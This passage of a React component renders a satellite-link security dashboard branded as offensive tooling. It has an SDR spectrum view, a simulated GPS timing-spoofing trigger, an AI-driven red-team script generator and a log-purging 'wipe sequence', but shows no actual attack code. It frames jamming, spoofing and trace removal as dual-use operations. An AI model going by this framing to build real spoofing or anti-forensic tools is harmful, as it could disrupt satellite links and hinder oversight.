                            : 'bg-gradient-to-t from-gray-900 to-[#FF4E00] hover:to-white';
                          return (
                            <div 
                              key={idx}
                              className={`flex-1 ${barGradient} transition-all duration-100`}
                              style={{ height: `${heightPct}%` }}
                              title={`Freq bin ${idx}: ${val.toFixed(1)} dB`}
                            ></div>
                          );
                        })}
                      </div>

                      {/* Live Spectrogram Waterfall Display */}
                      <div className="mt-3">
                        <div className="flex justify-between items-center mb-1 text-[8px] tracking-wider uppercase font-mono text-gray-400">
                          <span>Live Waterfall Spectrogram (History over Time)</span>
                          <span className={c_text_accent}>32 Swp Hist</span>
                        </div>
                        <div className={`h-24 border ${c_border} rounded overflow-hidden bg-black relative`}>
                          <canvas 
                            ref={canvasRef} 
                            width={500} 
                            height={96} 
                            className="w-full h-full block"
                          />
                        </div>
                      </div>

                      {/* PlutoSDR Live Interactive Params */}
                      <div className="grid grid-cols-3 gap-4 mt-4 font-mono text-xs">
                        <div>
                          <label className="block text-[8px] text-gray-500 uppercase mb-1">Center Frequency</label>
                          <input 
                            type="range" 
                            min="2.40" 
                            max="2.50" 
                            step="0.01"
                            value={plutoCenterFreq} 
                            onChange={(e) => setPlutoCenterFreq(Number(e.target.value))}
                            className={`w-full ${isDay ? 'accent-[#C2410C]' : 'accent-[#FF4E00]'} bg-black`}
                          />
                        </div>
                        <div>
                          <label className="block text-[8px] text-gray-500 uppercase mb-1">SDR RF Gain (dB)</label>
                          <input 
                            type="range" 
                            min="10" 
                            max="60" 
                            value={plutoGain} 
                            onChange={(e) => setPlutoGain(Number(e.target.value))}
                            className={`w-full ${isDay ? 'accent-[#C2410C]' : 'accent-[#FF4E00]'} bg-black`}
                          />
                        </div>
                        <div className="flex items-end">
                          <button 
                            onClick={() => setIsPlutoScanning(!isPlutoScanning)}
                            className={`w-full py-1 border ${c_border} ${isDay ? 'text-zinc-800 hover:border-[#C2410C] hover:text-[#C2410C]' : 'text-white hover:border-[#FF4E00] hover:text-[#FF4E00]'} text-[10px] font-bold uppercase transition-all`}
                          >
                            {isPlutoScanning ? 'Pause Scan' : 'Resume Scan'}
                          </button>
                        </div>
                      </div>
                    </div>

                    <p className="text-[10px] font-mono text-gray-500 mt-4 leading-normal">
                      The ADALM-Pluto SDR uses standard pyadi-iio to pull complex IQ samples, performs fast Fourier transform, and returns visual power spikes showing standard carrier health.
                    </p>
                  </div>

                  {/* GPS Clock Drift Simulator */}
                  <div className="border border-[#2A2A2A] bg-[#0D0D0D]/50 p-5 flex flex-col justify-between">
                    <div>
                      <div className="flex justify-between items-center mb-3">
                        <span className="text-[9px] font-mono text-[#FF4E00] tracking-widest uppercase font-bold">MOD-03_TDMA_SYNC</span>
                        <span className={`px-2 py-0.5 text-[8px] font-mono font-bold ${
                          gpsDrift < 1.0 ? 'bg-green-950/40 border border-green-800 text-green-400' : 'bg-red-950/40 border border-red-800 text-red-400'
                        }`}>
                          {gpsDrift < 1.0 ? 'CLOCK_SYNCED' : 'TDMA_DRIFT_ALERT'}
                        </span>
                      </div>
                      
                      <h3 className="text-lg font-bold text-white mb-2">GPS Clock Sync Audit</h3>
                      <p className="text-xs text-gray-400 leading-relaxed mb-4">
                        TDMA satellite links allocate microsecond transmission windows to user terminals. Spoofing or jamming the GPS timing clock results in a sync loss, disconnecting the terminal.
                      </p>

                      <div className="space-y-3 font-mono text-xs">
                        <div className="bg-[#111] p-3 border border-[#222]">
                          <span className="block text-[8px] text-gray-500 uppercase">GPS CLOCK JITTER / DRIFT</span>
                          <span className={`text-xl font-bold ${
                            gpsDrift < 1.0 ? 'text-[#FF4E00]' : 'text-red-500 animate-pulse'
                          }`}>
                            {gpsDrift.toFixed(3)} ms
                          </span>
                        </div>

                        <div className="text-[10px] text-gray-500 leading-normal">
                          Max drift tolerance: <span className="text-white font-bold">50.0 ms</span><br/>
                          Estimated Packet Drop Rate: <span className="text-white font-bold">
                            {gpsDrift > 50 ? '98.4%' : '0.00%'}
                          </span>
                        </div>
                      </div>
                    </div>

                    <div className="mt-4 pt-4 border-t border-[#1E1E1E]">
                      <button 
                        onClick={() => runSimulatedAttack('GPS_SPOOFING')}
                        disabled={isSimulatingAttack !== null}
                        className="w-full py-2 bg-[#FF4E00] text-black hover:bg-[#FF4E00]/80 font-mono text-xs font-black uppercase tracking-wider flex items-center justify-center gap-2"
                      >
                        <Play className="w-3.5 h-3.5 fill-current" /> Trigger Timing Spoofing
                      </button>
                    </div>
                  </div>

                </div>

                {/* Live Satellite Orbit Tracking calculation */}
                <div className="border border-[#2A2A2A] bg-[#0B0B0B] p-5">
                  <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 text-xs font-mono">
                    <div>
                      <span className="text-[#FF4E00] font-bold block mb-1">DOPPLER SHIFT AUTO-TRACKER</span>
                      <p className="text-gray-400 leading-relaxed">
                        LEO Satellites move rapidly, causing frequency shifts (Doppler drift). The local hardware receiver must automatically recalculate target carrier alignment parameters.
                      </p>
                    </div>
                    
                    <div className="flex gap-4 p-3 bg-black border border-[#222]">
                      <div>
                        <span className="block text-[8px] text-gray-500">DOPPLER DRIFT</span>
                        <span className="text-sm text-white font-bold">+14.82 kHz</span>
                      </div>
                      <div>
                        <span className="block text-[8px] text-gray-500">VELOCITY</span>
                        <span className="text-sm text-[#FF4E00] font-bold">7.5 km/sec</span>
                      </div>
                    </div>
                  </div>
                </div>

              </div>
            )}

            {/* Tab 6: COGNITIVE_SHIELD */}
            {activeTab === 'COGNITIVE_SHIELD' && (
              <div className="space-y-6 flex-1">
                <div className="border border-[#2A2A2A] bg-[#0E1520] p-6 rounded relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-64 h-64 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none"></div>
                  <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 relative z-10">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <Cpu className="w-5 h-5 text-[#06B6D4] animate-pulse" />
                        <span className="text-xs font-mono font-bold tracking-widest text-[#06B6D4] uppercase">COGNITIVE_THREAT_INTELLIGENCE_SHIELD</span>
                      </div>
                      <h3 className="text-xl font-bold text-white tracking-wider">Cognitive Telemetry Decider</h3>
                      <p className="text-xs text-slate-400 max-w-xl">
                        A real-time cognitive reasoning engine powered by server-side Gemini 3.8-Flash. It digests full subsystem RF parameters, ACU directions, and raw terminal logs to identify stealthy advanced threats from first principles.
                      </p>
                    </div>
                    <button
                      onClick={triggerShieldAnalysis}
                      disabled={isShieldAnalyzing}
                      className="px-5 py-3 bg-[#06B6D4] hover:bg-cyan-500 disabled:bg-[#1A2A2D] text-black font-mono text-xs font-black uppercase tracking-wider flex items-center justify-center gap-2 rounded shrink-0 transition-all border border-cyan-400"
                    >
                      {isShieldAnalyzing ? (
                        <>
                          <RefreshCw className="w-4 h-4 animate-spin" /> Analyzing Telemetry...
                        </>
                      ) : (
                        <>
                          <Zap className="w-4 h-4 fill-current" /> Analyze System Baseline
                        </>
                      )}
                    </button>
                  </div>
                </div>

                {/* Cognitive Diagnostics Results HUD */}
                {shieldResult ? (
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                    {/* Status & Threat Level Card */}
                    <div className="border border-[#2A2A2A] bg-black/40 p-5 rounded space-y-4">
                      <span className="text-[9px] font-mono text-slate-500 uppercase tracking-widest font-bold">ANALYSIS STATUS</span>
                      <div>
                        <span className="block text-[10px] text-slate-400 uppercase font-mono">DEDUCED STATUS</span>
                        <div className="text-lg font-mono font-black text-white uppercase tracking-tight flex items-center gap-2 mt-1">
                          <span className={`w-2 h-2 rounded-full ${
                            shieldResult.threatLevel === 'HIGH' ? 'bg-red-500 animate-ping' : shieldResult.threatLevel === 'MEDIUM' ? 'bg-amber-500' : 'bg-emerald-500 animate-pulse'
                          }`}></span>
                          {shieldResult.status || 'UNKNOWN'}
                        </div>
                      </div>
                      <div>
                        <span className="block text-[10px] text-slate-400 uppercase font-mono">THREAT CLASSIFICATION</span>
                        <span className={`inline-block mt-1.5 px-3 py-1 text-xs font-mono font-bold tracking-widest uppercase border ${
                          shieldResult.threatLevel === 'HIGH' ? 'bg-red-950/30 border-red-800 text-red-400' : shieldResult.threatLevel === 'MEDIUM' ? 'bg-amber-950/30 border-amber-800 text-amber-400' : 'bg-emerald-950/30 border-emerald-800 text-emerald-400'
                        }`}>
                          {shieldResult.threatLevel || 'LOW'}
                        </span>
                      </div>
                      <div className="pt-2 border-t border-[#1E1E1E]">
                        <span className="block text-[9px] text-slate-500 font-mono">PQC AUDIT TOKEN:</span>
                        <span className="text-[10px] font-mono text-cyan-500 break-all select-all inline-block mt-0.5">{shieldResult.signature || '[NOT_SIGNED]'}</span>
                      </div>
                    </div>

                    {/* Technical Diagnosis */}
                    <div className="border border-[#2A2A2A] bg-black/40 p-5 rounded space-y-3 md:col-span-2">
                      <span className="text-[9px] font-mono text-[#06B6D4] uppercase tracking-widest font-bold">COGNITIVE ROOT CAUSE DIAGNOSIS</span>
                      <h4 className="text-base font-bold text-white">Empirical Reasoning Summary</h4>
                      <p className="text-xs text-slate-300 leading-relaxed font-mono bg-black p-4 border border-[#1A1A1A] rounded">
                        {shieldResult.diagnosis || 'No anomaly detected. System functioning within regular designated operational constraints.'}
                      </p>

                      {/* Mitigation Playbook */}
                      <div className="space-y-2 pt-1.5">
                        <span className="block text-[9px] text-slate-500 font-mono tracking-wider uppercase">TACTICAL RESPONDER PLAYBOOK:</span>
                        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                          {shieldResult.playbook?.map((step, idx) => (
                            <div key={idx} className="p-3 bg-cyan-950/10 border border-cyan-900/30 rounded flex gap-2">
                              <span className="text-cyan-500 font-mono text-xs font-black">0{idx + 1}.</span>
                              <p className="text-[11px] text-slate-300 leading-normal font-sans">{step}</p>
                            </div>
                          )) || (
                            <div className="col-span-3 text-center text-xs text-slate-500 font-mono py-2">No playbook items compiled. System is stable.</div>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="h-64 border border-dashed border-[#2A2A2A] bg-black/5 flex flex-col items-center justify-center text-center p-6 rounded">
                    <Shield className="w-12 h-12 text-slate-700 mb-3 animate-pulse" />
                    <h4 className="text-sm font-bold text-white mb-1">Cognitive Shield Standby</h4>
                    <p className="text-xs text-slate-400 max-w-sm">
                      Execute a system baseline audit. The AI decider will inspect current telemetry stats (SNR, BER, drift, and log events) to spot sophisticated anomalies.
                    </p>
                  </div>
                )}
              </div>
            )}

            {/* Tab 7: COGNITIVE_SCRIPT_GEN */}
            {activeTab === 'COGNITIVE_SCRIPT_GEN' && (
              <div className="space-y-6 flex-1">
                <div className="border border-[#2A2A2A] bg-[#120F16] p-6 rounded relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-64 h-64 bg-purple-500/5 rounded-full blur-3xl pointer-events-none"></div>
                  <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 relative z-10">
                    <div className="space-y-1">
                      <div className="flex items-center gap-2">
                        <Code2 className="w-5 h-5 text-purple-400" />
                        <span className="text-xs font-mono font-bold tracking-widest text-purple-400 uppercase">COGNITIVE_SCRIPT_COMPILER_SERVICE</span>
                      </div>
                      <h3 className="text-xl font-bold text-white tracking-wider">Interactive Custom Python Tool Generator</h3>
                      <p className="text-xs text-slate-400 max-w-xl">
                        Harness server-side Gemini 3.8-Flash to compile tailored, production-ready diagnostic and red-team audit scripts for your exact testing scenario.
                      </p>
                    </div>
                  </div>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-3 gap-6 items-start">
                  {/* Left Controls */}
                  <div className="border border-[#2A2A2A] bg-[#0D0D0D]/60 p-5 rounded space-y-4">
                    <span className="text-[9px] font-mono text-slate-500 uppercase tracking-widest font-bold block mb-1">SCRIPT SPECIFICATIONS</span>
                    
                    <div className="space-y-1">
                      <label className="block text-[10px] font-mono text-slate-400 uppercase tracking-wider">Test Scenario / Objective</label>
                      <textarea
                        value={scriptGenScenario}
                        onChange={(e) => setScriptGenScenario(e.target.value)}
                        placeholder="e.g. Detect satellite carrier jamming spikes on standard Pluto frequencies"
                        rows={3}
                        className="w-full bg-black border border-[#2A2A2A] text-white p-2.5 text-xs font-mono focus:border-purple-500 focus:outline-none rounded leading-normal"
                      />
                    </div>

                    <div className="space-y-1">
                      <label className="block text-[10px] font-mono text-slate-400 uppercase tracking-wider">Target Hardware / Protocol / API</label>
                      <input
                        type="text"
                        value={scriptGenTarget}
                        onChange={(e) => setScriptGenTarget(e.target.value)}
                        placeholder="e.g. ADALM-Pluto SDR via pyadi-iio"
                        className="w-full bg-black border border-[#2A2A2A] text-white p-2.5 text-xs font-mono focus:border-purple-500 focus:outline-none rounded"
                      />
                    </div>

                    <button
                      onClick={triggerScriptGeneration}
                      disabled={isScriptGenerating}
                      className="w-full py-3 bg-purple-600 hover:bg-purple-500 disabled:bg-purple-950 text-white font-mono text-xs font-black uppercase tracking-wider flex items-center justify-center gap-2 rounded transition-all border border-purple-400"
                    >
                      {isScriptGenerating ? (
                        <>
                          <RefreshCw className="w-4 h-4 animate-spin" /> Compiling Custom Tool...
                        </>
                      ) : (
                        <>
                          <Code2 className="w-4 h-4" /> Compile Defensive Tool
                        </>
                      )}
                    </button>
                  </div>

                  {/* Right Script Output */}
                  <div className="md:col-span-2 space-y-4">
                    {scriptGenOutput ? (
                      <div className="border border-[#2A2A2A] bg-black/40 p-5 rounded space-y-4">
                        <div className="flex justify-between items-center border-b border-[#1E1E1E] pb-3">
                          <div>
                            <span className="text-[10px] font-mono text-purple-400 tracking-widest uppercase font-bold">COGNITIVE COMPILER OUTPUT</span>
                            <h4 className="text-base font-bold text-white mt-0.5">{scriptGenOutput.scriptTitle || 'Compiled Custom Python Script'}</h4>
                          </div>
                          <button
                            onClick={() => handleCopyCode('custom_ai_tool', scriptGenOutput.code || '')}
                            className="flex items-center gap-1.5 px-3 py-1.5 bg-purple-950/30 hover:bg-purple-600 text-purple-400 hover:text-white border border-purple-800/40 hover:border-purple-400 rounded text-[10px] font-mono transition-all uppercase font-bold"
                          >
                            <Copy className="w-3.5 h-3.5" /> Copy Custom Script
                          </button>
                        </div>

                        <p className="text-xs text-slate-300 leading-relaxed font-sans">{scriptGenOutput.scriptDescription}</p>

                        <div className="relative">
                          <pre className="p-4 bg-black border border-[#222] text-[11px] font-mono text-gray-300 overflow-x-auto rounded max-h-80 leading-relaxed whitespace-pre">
                            {scriptGenOutput.code}
                          </pre>
                        </div>

                        {scriptGenOutput.operatorNotes && (
                          <div className="p-3.5 bg-purple-950/10 border border-purple-900/30 rounded-lg">
                            <span className="text-[9px] font-mono text-purple-400 uppercase tracking-widest font-bold block mb-1">OPERATOR INSTRUCTIONS & NOTES</span>
                            <p className="text-xs text-slate-300 leading-normal font-mono">{scriptGenOutput.operatorNotes}</p>
                          </div>
                        )}
                      </div>
                    ) : (
                      <div className="h-[432px] border border-dashed border-[#2A2A2A] bg-black/5 flex flex-col items-center justify-center text-center p-6 rounded">
                        <Code2 className="w-12 h-12 text-slate-700 mb-3 animate-pulse" />
                        <h4 className="text-sm font-bold text-white mb-1">Cognitive Tool Maker Standby</h4>
                        <p className="text-xs text-slate-400 max-w-sm">
                          Define your test scenario and target. The script compiler service will construct a complete, documented Python tool with executable logic.
                        </p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
            )}

            {/* Tab 5: CODE_VAULT */}
            {activeTab === 'CODE_VAULT' && (
              <div className="space-y-6 flex-1">
                <div className="flex justify-between items-center mb-4">
                  <div>
                    <h3 className="text-lg font-bold tracking-wider text-white">Hardened Python Script Library</h3>
                    <p className="text-xs text-gray-400">Copy or review the full production-ready diagnostic tools directly below.</p>
                  </div>
                  <div className="flex gap-2">
                    <button 
                      onClick={() => triggerDownload('monitoring_guide.txt', 'Monitoring & Detection System Setup')}
                      className="px-3 py-1.5 border border-[#2A2A2A] hover:border-[#FF4E00] text-white text-[10px] font-mono uppercase font-bold"
                    >
                      Detection Guide
                    </button>
                    <button 
                      onClick={() => triggerDownload('resilience_plan.txt', 'Resilience & Failover Systems Playbook')}
                      className="px-3 py-1.5 border border-[#2A2A2A] hover:border-[#FF4E00] text-white text-[10px] font-mono uppercase font-bold"
                    >
                      Failover Playbook
                    </button>
                  </div>
                </div>

                {/* Categorized List of Python/Scapy Codeblocks */}
                <div className="space-y-6">
                  {scriptsCatalog.map((item) => (
                    <div key={item.id} className="border border-[#2A2A2A] bg-[#0D0D0D]/40 p-5 rounded flex flex-col justify-between">
                      <div>
                        <div className="flex justify-between items-center mb-2">
                          <span className="text-[10px] font-mono text-[#FF4E00] tracking-widest uppercase font-bold">{item.category} // {item.id.toUpperCase()}</span>
                          <span className="px-2 py-0.5 bg-gray-900 border border-gray-800 text-gray-400 text-[8px] font-mono">LANGUAGE: PYTHON3</span>
                        </div>
                        <h4 className="text-base font-bold text-white mb-2">{item.title}</h4>
                        <p className="text-xs text-gray-400 mb-4 leading-relaxed">{item.description}</p>
                      </div>

                      {/* Code Block Window */}
                      <div className="relative">
                        <pre className="p-4 bg-black border border-[#222] text-[11px] font-mono text-gray-300 overflow-x-auto rounded max-h-72 leading-relaxed whitespace-pre">
                          {item.code}
                        </pre>
                        
                        <button 
                          onClick={() => handleCopyCode(item.id, item.code)}
                          className="absolute top-2 right-2 p-2 bg-[#1A1A1A] hover:bg-[#FF4E00] text-gray-400 hover:text-black border border-[#2A2A2A] transition-all flex items-center justify-center rounded"
                          title="Copy script to clipboard"
                        >
                          {copiedId === item.id ? (
                            <Check className="w-3.5 h-3.5" />
                          ) : (
                            <Copy className="w-3.5 h-3.5" />
                          )}
                        </button>
                      </div>
                    </div>
                  ))}
                </div>

              </div>
            )}

            {/* Simulated Live Diagnostic Terminal Logs Terminal Component */}
            <div className="mt-8 border border-[#2A2A2A] bg-[#0D0D0D]/40 p-4 rounded flex flex-col gap-3 shrink-0">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between border-b border-[#2A2A2A] pb-2.5 text-[9px] font-mono text-gray-400 gap-2">
                <span className="flex items-center gap-1.5 font-bold uppercase text-gray-300">
                  <Terminal className="w-3.5 h-3.5 text-[#FF4E00]" /> Raw Live Diagnostic Log Feed
                </span>
                <div className="flex items-center gap-3">
                  <button 
                    onClick={exportData}
                    className="flex items-center gap-1.5 px-2.5 py-1 bg-[#1A1A1A] hover:bg-[#FF4E00] text-gray-300 hover:text-black border border-[#2A2A2A] rounded text-[9px] font-mono transition-all uppercase font-bold"
                  >
                    <Download className="w-3 h-3" /> Export Data
                  </button>
                  <span className="text-[#FF4E00] font-bold">STATUS_ONLINE</span>
                </div>
              </div>

              {/* Log Feed Container */}
              <div className="flex flex-col h-36 overflow-y-auto font-mono text-[10px] leading-relaxed text-gray-400 space-y-1.5 pr-2">
                {logs.map((log, idx) => {
                  const { timestamp, tag, message } = getLogDetails(log);
                  const config = getTagConfig(tag);
                  return (
                    <div key={idx} className="flex items-center gap-3 py-1 px-2.5 hover:bg-white/5 rounded transition-colors font-mono border-b border-[#1A1A1A]/40 last:border-0">
                      <span className="text-zinc-500 font-mono text-[9px] w-16 shrink-0 text-left">
                        {timestamp ? `[${timestamp}]` : '[00:00:00]'}
                      </span>
                      <span className={`text-[8px] tracking-widest font-mono font-bold px-2 py-0.5 rounded border text-center w-24 shrink-0 flex items-center justify-center ${config.bg} ${config.text}`}>
                        {config.label}
                      </span>
                      <span className={`text-[10px] ${config.msgText} break-words flex-1 min-w-0`}>
                        {message}
                      </span>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Mobile/Tablet Threat Landscape & Security Controls */}
            <div className="mt-8 lg:hidden border-t border-[#2A2A2A] pt-6 space-y-6 shrink-0">
              <h4 className="text-[10px] font-bold tracking-[0.4em] uppercase text-gray-500">Threat Landscape & Tools</h4>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="border border-[#2A2A2A] bg-[#0D0D0D]/50 p-5 space-y-5">
                  <div>
                    <div className="flex justify-between items-end mb-1">
                       <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider font-mono">JAMMING_PROBABILITY</span>
                       <span className="text-xs font-bold text-white italic font-mono">{jammingProbability}</span>
                    </div>
                    <div className="w-full h-1.5 bg-[#2A2A2A] rounded-full overflow-hidden">
                      <div className={`h-full bg-[#FF4E00] transition-all duration-500 ${
                        jammingProbability === 'LOW' ? 'w-1/4' : jammingProbability === 'MEDIUM' ? 'w-2/4' : 'w-11/12'
                      }`}></div>
                    </div>
                  </div>
                  
                  <div>
                    <div className="flex justify-between items-end mb-1">
                       <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider font-mono">ENCRYPTION_STRENGTH</span>
                       <span className="text-xs font-bold text-white italic font-mono">MAX</span>
                    </div>
                    <div className="w-full h-1.5 bg-[#2A2A2A] rounded-full overflow-hidden">
                      <div className="w-full h-full bg-[#FF4E00]"></div>
                    </div>
                  </div>

                  <div>
                    <div className="flex justify-between items-end mb-1">
                       <span className="text-[10px] font-bold text-gray-400 uppercase tracking-wider font-mono">TIMING_ALIGNED_SLOTS</span>
                       <span className="text-xs font-bold text-white italic font-mono">
                         {gpsDrift < 1.0 ? '99.9%' : '14.2%'}
                       </span>
                    </div>
                    <div className="w-full h-1.5 bg-[#2A2A2A] rounded-full overflow-hidden">
                      <div className={`h-full bg-[#FF4E00] transition-all duration-500 ${
                        gpsDrift < 1.0 ? 'w-full' : 'w-[14.2%]'
                      }`}></div>
                    </div>
                  </div>
                </div>

                <div className="border border-[#2A2A2A] bg-[#0D0D0D]/50 p-5 flex flex-col justify-between gap-4">
                  <div>
                    <span className="text-[9px] font-mono text-gray-500 uppercase tracking-wider block mb-2">Active Equipment Binding</span>
                    <div className="grid grid-cols-2 gap-x-4 gap-y-1.5 text-[10px] font-mono text-gray-400">
                      <div>SDR Device:</div>
                      <div className="text-white text-right">ADALM-Pluto USB</div>
                      <div>IP Address:</div>
                      <div className="text-white text-right">192.168.2.1</div>
                      <div>GPS Source:</div>
                      <div className="text-white text-right font-mono">NMEA $GPRMC serial</div>
                    </div>
                  </div>
                  <button 
                    onClick={() => {
                      addLog('[EMERGENCY] Triggering local buffer audit & trace purge...');
                      resetSimulators();
                      alert('[GHOST-WATCH TERMINAL SECURE WIPE]\nPurged local logs, cleared in-transit spectrum data, and restored baseline security configurations.');
                    }}
                    className="w-full bg-[#FF4E00] text-black hover:bg-white hover:text-black py-2.5 font-mono text-[10px] font-black tracking-wider uppercase transition-all"
                  >
                    Trigger Wipe Sequence
                  </button>
                </div>
              </div>
            </div>

          </main>

          {/* Right Stats & Threat Landscape Info Sidebar */}
          <aside className="w-72 border-l border-[#2A2A2A] p-6 sm:p-8 bg-[#0B0B0B] flex flex-col justify-between shrink-0 hidden lg:flex">
            
            <div className="space-y-8">
              <div>
                <h4 className="text-[10px] font-bold tracking-[0.4em] uppercase text-gray-500 mb-4">Threat Landscape</h4>
                
                <div className="space-y-5">
                  <div>
                    <div className="flex justify-between items-end mb-1">
                       <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider font-mono">JAMMING_PROBABILITY</span>
                       <span className="text-lg font-light italic font-display">{jammingProbability}</span>
                    </div>
                    <div className="w-full h-1.5 bg-[#2A2A2A] rounded-full overflow-hidden">
                      <div className={`h-full bg-[#FF4E00] transition-all duration-500 ${
                        jammingProbability === 'LOW' ? 'w-1/4' : jammingProbability === 'MEDIUM' ? 'w-2/4' : 'w-11/12'
                      }`}></div>
                    </div>
                  </div>
                  
                  <div>
                    <div className="flex justify-between items-end mb-1">
                       <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider font-mono">ENCRYPTION_STRENGTH</span>
                       <span className="text-lg font-light italic font-display">MAX</span>
                    </div>
                    <div className="w-full h-1.5 bg-[#2A2A2A] rounded-full overflow-hidden">
                      <div className="w-full h-full bg-[#FF4E00]"></div>
                    </div>
                  </div>

                  <div>
                    <div className="flex justify-between items-end mb-1">
                       <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider font-mono">TIMING_ALIGNED_SLOTS</span>
                       <span className="text-lg font-light italic font-display">
                         {gpsDrift < 1.0 ? '99.9%' : '14.2%'}
                       </span>
                    </div>
                    <div className="w-full h-1.5 bg-[#2A2A2A] rounded-full overflow-hidden">
                      <div className={`h-full bg-[#FF4E00] transition-all duration-500 ${
                        gpsDrift < 1.0 ? 'w-full' : 'w-[14.2%]'
                      }`}></div>
                    </div>
                  </div>
                </div>
              </div>

              <div>
                <h4 className="text-[10px] font-bold tracking-[0.4em] uppercase text-gray-500 mb-4">Active Equipment Binding</h4>
                <div className="space-y-2 text-[10px] font-mono leading-relaxed text-gray-400">
                  <div className="flex justify-between border-b border-[#1E1E1E] py-1">
                    <span>SDR Device:</span>
                    <span className="text-white">ADALM-Pluto USB</span>
                  </div>
                  <div className="flex justify-between border-b border-[#1E1E1E] py-1">
                    <span>IP Address:</span>
                    <span className="text-white">192.168.2.1</span>
                  </div>
                  <div className="flex justify-between border-b border-[#1E1E1E] py-1">
                    <span>GPS Source:</span>
                    <span className="text-white">NMEA $GPRMC serial</span>
                  </div>
                  <div className="flex justify-between border-b border-[#1E1E1E] py-1">
                    <span>Local Proxy:</span>
                    <span className="text-white">SAT_PEP_ACCEL</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Urgent Warning Block */}
            <div className="space-y-4 pt-6 border-t border-[#1E1E1E]">
              <div className="bg-[#FF4E00] p-5 text-black">
                <h5 className="font-black text-lg leading-none mb-1 font-display uppercase tracking-tight">EMERGENCY<br/>KILL_SWITCH</h5>
                <p className="text-[9px] font-mono font-bold tracking-widest text-black/80">CTRL+ALT+WIPE</p>
                <button 
                  onClick={() => {
                    addLog('[EMERGENCY] Triggering local buffer audit & trace purge...');
                    resetSimulators();
                    alert('[GHOST-WATCH TERMINAL SECURE WIPE]\nPurged local logs, cleared in-transit spectrum data, and restored baseline security configurations.');
                  }}
                  className="mt-3 w-full bg-black text-[#FF4E00] hover:text-white hover:bg-black/80 p-1.5 font-mono text-[9px] font-bold tracking-wider uppercase transition-all"
                >
                  Trigger Wipe Sequence
                </button>
              </div>
              <div className="text-[9px] font-mono text-gray-500 leading-normal">
                (C) 2026 GHOST-WATCH OFFENSIVE<br/>
                RESTRICTED AUTHORIZED ACCESS ONLY
              </div>
            </div>

          </aside>

        </div>
      </div>
    </div>
  );
}
